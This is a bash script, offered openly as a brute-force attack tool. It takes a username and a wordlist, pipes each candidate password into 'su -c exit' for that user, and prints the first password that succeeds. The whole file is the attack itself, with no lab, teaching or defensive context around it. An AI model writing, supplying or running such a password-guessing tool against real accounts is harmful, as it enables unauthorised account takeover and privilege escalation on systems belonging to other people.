#!/bin/bash

# Check if the required arguments are provided
if [ "$#" -lt 4 ]; then
    echo "Usage: $0 -u <username> -w <wordlist>"
    exit 1
fi

# Parse the arguments
while getopts ":u:w:" opt; do
    case $opt in
        u) USERNAME="$OPTARG" ;;
        w) WORDLIST="$OPTARG" ;;
        \?) echo "Invalid option: -$OPTARG" >&2; exit 1 ;;
        :) echo "Option -$OPTARG requires an argument." >&2; exit 1 ;;
    esac
done

# Check if the wordlist file exists
if [ ! -f "$WORDLIST" ]; then
    echo "Error: Wordlist file '$WORDLIST' does not exist."
    exit 1
fi

# Start the brute force attempt
echo "Starting brute-force attack on user: $USERNAME"

while IFS= read -r PASSWORD; do
    echo "Trying password: $PASSWORD"
    
    # Attempt to switch user using the supplied password and the su command
    echo "$PASSWORD" | su -c "exit" "$USERNAME" &>/dev/null

    # Check if the password was successful
    if [ $? -eq 0 ]; then
        echo "Success! Password for user '$USERNAME' is: $PASSWORD"
        exit 0
    fi
done < "$WORDLIST"

echo "Brute-force attack finished. No valid password found."
exit 1
